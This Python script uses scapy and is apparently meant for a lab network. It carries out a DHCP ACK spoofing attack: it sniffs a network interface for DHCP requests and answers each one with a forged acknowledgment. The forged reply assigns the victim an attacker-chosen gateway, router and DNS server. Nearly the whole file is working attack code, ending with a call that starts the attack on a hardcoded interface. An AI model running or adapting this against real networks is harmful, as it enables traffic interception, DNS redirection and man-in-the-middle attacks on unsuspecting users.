__author__ = 'root'

import scapy.all
import scapy.layers as layers
from scapy.sendrecv import *
import random


class DomainConfig:

    def __init__(self, gateway, broadcast, netmask, domain_name, nameserver=None):
        self.gateway = gateway
        self.broadcast = broadcast
        self.netmask = netmask
        self.domain_name = domain_name
        self.nameserver = nameserver


class DHCPAckSpoofing:

    def __init__(self, interface, domain_config):
        self.interface = interface
        self.domain_config = domain_config

        #TODO pre-load routers (do a discovery) MAC addresses to spoof them better

    def hook_dhcp_request(self, udp_packet):
        if layers.dhcp.DHCP in udp_packet:
            dhcp_packet = udp_packet[layers.dhcp.DHCP]
            dhcp_type_index = dhcp_packet.options[0][1]

            if dhcp_type_index == 3:
                self.send_spoofed_ack(udp_packet)
                return True

    def send_spoofed_ack(self, dhcp_request_udp_packet):
        victim_mac = dhcp_request_udp_packet[layers.l2.Ether].src
        spoofed_ack = layers.l2.Ether(dst=victim_mac)

        spoofed_ack = spoofed_ack/layers.inet.IP()
        spoofed_ack[layers.inet.IP].src = self.domain_config.gateway
        spoofed_ack[layers.inet.IP].dst = '10.0.0.99'
        spoofed_ack[layers.inet.IP].id = random.randrange(200, 0xFFFF)

        spoofed_ack = spoofed_ack/layers.inet.UDP()

        spoofed_ack = spoofed_ack/layers.dhcp.BOOTP()
        spoofed_ack[layers.dhcp.BOOTP].op = 'BOOTREPLY'
        xid = dhcp_request_udp_packet[layers.dhcp.BOOTP].xid
        spoofed_ack[layers.dhcp.BOOTP].xid = xid

        spoofed_ack[layers.dhcp.BOOTP].yiaddr = '10.0.0.99'

        #Get the IP of the DHCP server requested by client
        dhcp_request_options = dhcp_request_udp_packet[layers.dhcp.DHCP].options
        requested_dhcp_ip = next((x for x in dhcp_request_options if x[0] == 'server_id'),
                                 (None, '10.0.0.169'))[1]

        spoofed_ack[layers.dhcp.BOOTP].siaddr = requested_dhcp_ip
        chaddr = dhcp_request_udp_packet[layers.dhcp.BOOTP].chaddr
        spoofed_ack[layers.dhcp.BOOTP].chaddr = chaddr

        #Craft the spoofed DHCP packet
        message_type = ('message-type', 5)
        server_id = ('server_id', requested_dhcp_ip)
        lease_time = ('lease_time', 3600)
        renewal_time = ('renewal_time', 1800)
        rebinding_time = ('rebinding_time', 3150)
        subet_mask = ('subnet_mask', self.domain_config.netmask)
        broadcast_address = ('broadcast_address', self.domain_config.broadcast)
        domain = ('domain', self.domain_config.domain_name)
        #TODO change this!!
        hostname = ('hostname', 'victim')
        if self.domain_config.nameserver:
            name_server = ('name_server', self.domain_config.nameserver)
        else:
            name_server = ('name_server', self.domain_config.gateway)
        router = ('router', self.domain_config.gateway)

        spoofed_ack = spoofed_ack/layers.dhcp.DHCP(options=[
            message_type,
            server_id,
            lease_time,
            renewal_time,
            rebinding_time,
            subet_mask,
            broadcast_address,
            domain,
            hostname,
            name_server,
            router,
            'end'
        ])
        spoofed_ack.show()
        sendp(spoofed_ack, iface=self.interface)

    def launch_attack(self):
        scapy.sendrecv.sniff(iface=self.interface, filter='udp', prn=self.hook_dhcp_request)

domain = DomainConfig(
    gateway='10.0.0.156',
    broadcast='10.0.0.255',
    netmask='255.255.255.0',
    domain_name='intranet_lab.net',
    nameserver='5.5.5.5'
    )

attack = DHCPAckSpoofing(interface='wlp3s0', domain_config=domain)
attack.launch_attack()